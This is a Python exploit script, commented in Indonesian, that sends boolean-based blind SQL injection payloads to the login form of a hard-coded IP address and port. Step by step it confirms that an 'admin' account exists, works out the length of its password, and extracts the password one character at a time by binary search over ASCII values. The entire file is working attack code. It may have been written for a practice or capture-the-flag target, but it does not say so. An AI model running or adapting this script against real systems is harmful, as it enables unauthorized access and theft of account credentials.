import requests

url = 'http://103.31.39.226:7004/index.php'

def send_payload(condition):
    payload = {
        'username': f"' OR {condition}-- ",
        'password': 'x'
    }
    return 'Welcome!' in requests.post(url, data=payload).text

# Step 1: Cek apakah user 'admin' ada
if not send_payload("username='Admin'"):
    print("Admin tidak ditemukan.")
    exit()
print("Admin ditemukan.")

# Step 2: Cari panjang password
length = 1
while not send_payload(f"(SELECT LENGTH(password) FROM users WHERE username='admin')={length}"):
    length += 1
print(f"Panjang password: {length}")

# Step 3: Ekstrak password karakter per karakter
password = ''
for i in range(1, length + 1):
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        if send_payload(f"(SELECT ASCII(SUBSTR(password,{i},1)) FROM users WHERE username='admin')<={mid}"):
            hi = mid - 1
        else:
            lo = mid + 1
    if send_payload(f"(SELECT ASCII(SUBSTR(password,{i},1)) FROM users WHERE username='admin')={lo}"):
        password += chr(lo)
        print(f"Char {i}: {chr(lo)}")
    else:
        password += '?'
        print(f"Char {i}: Unknown")

print(f"Password admin: {password}")
